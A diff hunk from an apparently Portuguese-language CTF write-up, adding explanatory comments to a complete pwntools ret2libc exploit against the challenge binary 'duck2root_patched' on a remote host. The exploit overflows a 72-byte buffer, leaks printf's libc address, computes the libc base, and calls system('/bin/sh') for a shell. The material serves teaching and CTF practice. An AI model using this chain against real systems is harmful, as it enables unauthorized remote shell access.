@@ -361,43 +361,80 @@ EXPLOIT QUE FINALMENTE FUNCIONA (depois de muitas iterações, perguntas e dúvi
 
 from pwn import * 
 
-exe = process('./duck2root_patched')
-p = remote("tribopapaxota.org", 5001)
+exe = process('./duck2root_patched') # run the vulnerable program
+p = remote("tribopapaxota.org", 5001) # establish a connetion 
 
-pop_rdi = 0x40126d
-printf_at_got = 0x404018
-puts_at_plt = 0x401030
-ret_to_vuln = 0x401272
+"""
+Plan to leak an address:
+- use puts
+- supply arguments to puts
+- we will use ROP to do this:
+	but will need the x64 calling conventions
+- that means the register 'rdi' is the first argument
+	we want to find a ropgadget that modifies (like a mov or pop) the rdi 
+"""
 
-payload = b"A"*72
-payload += p64(pop_rdi) # pop rdi; ret
-payload += p64(printf_at_got) # printf got
-payload += p64(puts_at_plt) # puts plt
-payload += p64(ret_to_vuln) # return to ask 
+pop_rdi = 0x40126d # 0x000000000040126d : pop rdi ; ret (ROPgadget --bin duck2root_patched)
+printf_at_got = 0x404018 # PTR_printf_00404018, address of .got.plt section of libc function printf in ghidra
+puts_at_plt = 0x401030 # 00401030, address of .plt section of the libc function puts in ghidra
+back_to_vuln = 0x401272 # 00401272, address of vulnerable_function in ghidra
 
-p.sendlineafter("Patonymous?>\n",payload) # send payload
+payload = b"A"*72 # creating our payload that will overflow, we discovered that with 'pattern offset $rsp'
+payload += p64(pop_rdi) # supply an argument to a function that we end up calling, system
+payload += p64(printf_at_got) # address we want to leak
+payload += p64(puts_at_plt) # callpoint
+payload += p64(back_to_vuln) # jump back to vuln
 
-leak = u64(p.recvline().strip().ljust(8, b"\x00")) # leaked address
+p.sendlineafter(f"Patonymous?>\n",payload) # send payload
 
-log.info(f"Leaked printf address: {hex(leak)}")
+leak = u64(p.recvline().strip().ljust(8, b"\x00")) # get leaked address
 
+log.info(f"Leaked printf libc address: {hex(leak)}") # print leaked address
+
+"""
+Plan to calculate the offset (getting the difference between the leaked address and the system address)
+between printf (function we leaked) and system (function we want to call )
+
+`readelf -s ./libc.so.6 | grep printf` (print the address of printf)
+2922: 00000000000606f0   204 FUNC    GLOBAL DEFAULT   15 printf@@GLIBC_2.2.5
+"""
 printf_offset = 0x606f0
 
-base_address = leak - printf_offset # calculate base address libc
-log.info(f"Leaked libc base address: {hex(base_address)}")
-input()
-libc_binsh = 0x1d8678 # offset /bin/sh
-libc_system = 0x0000000000050d70 # offset system
-log.info(f"Leaked libc system address: {hex(base_address + libc_system)}")
+# Now we take our leaked address and subtract 0x606f0, and then we find the actual loaded address of libc
+base_address = leak - printf_offset
+log.info(f"Leaked libc base address: {hex(base_address)}") # print our leaked libc base address
 
-# second ROPchain (payload), now that its waiting to receive input
+"""
+calcule the address of function system
 
-payload2 = b"A" * 72
-payload2 += p64(pop_rdi)
-payload2 += p64(base_address + libc_binsh) # libc -> /bin/sh > strings -a -t x ./libc.so.6 | grep "/bin/sh"
-payload2 += p64(0x000000000040101a) # ret > ROPgadget --bin binary | grep ret
-payload2 += p64(base_address + libc_system) # libc -> system
-p.sendlineafter("Patonymous?>\n", payload2) # >;) - delivery payload
+`readelf -s ./libc.so.6 | grep system`
+1481: 0000000000050d70    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
+"""
+libc_system = 0x50d70
+log.info(f"Leaked system address: {hex(base_address + libc_system)}") # get the actual physical in memory address of system
+
+"""
+check if /bin/sh is in libc.so.6
+strings libc.so.6 | grep /bin/sh
+"""
+
+"""
+strings -a -t x ./libc.so.6 | grep "/bin/sh"
+1d8678 /bin/sh
+"""
+libc_binsh = 0x1d8678
+
+# second ROPchain (payload)
+
+ret = 0x40101a # `ROPgadget --bin duck2root_patched | grep ret`
+
+payload2 = b"A"*72 # creating our payload that will overflow
+payload2 += p64(pop_rdi) # # supply an argument to a function that we end up calling, system
+payload2 += p64(base_address + libc_binsh) # get /bin/sh addres in libc
+payload2 += p64(ret) # so that whenever we call a sytem function, the last digit is a 0, basically for stack allignment
+payload2 += p64(base_address + libc_system) # get system address in lib
+
+p.sendlineafter(f"Patonymous?>\n",payload2) # send our second payload
 
 p.interactive()
 ```
